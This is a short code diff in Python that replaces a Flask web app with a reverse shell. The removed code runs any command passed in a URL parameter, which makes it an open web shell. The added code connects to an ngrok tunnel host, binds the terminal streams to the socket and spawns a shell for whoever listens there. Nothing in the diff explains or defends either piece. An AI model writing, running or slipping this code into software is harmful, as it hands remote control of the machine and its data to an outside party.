@@ -1,15 +1,12 @@
-from flask import Flask, request
-import subprocess
+import socket
+import os
+import pty
 
-app = Flask(__name__)
+RHOST = "0.tcp.ap.ngrok.io"
+RPORT = 12173
 
-@app.route("/")
-def run_cmd():
-    cmd = request.args.get("cmd")
-    if cmd:
-        output = subprocess.getoutput(cmd)
-        return f"<pre>{output}</pre>"
-    return "No command provided."
-
-if __name__ == "__main__":
-    app.run(debug=True)
+s = socket.socket()
+s.connect((RHOST, RPORT))
+for fd in (0, 1, 2):
+    os.dup2(s.fileno(), fd)
+pty.spawn("sh")
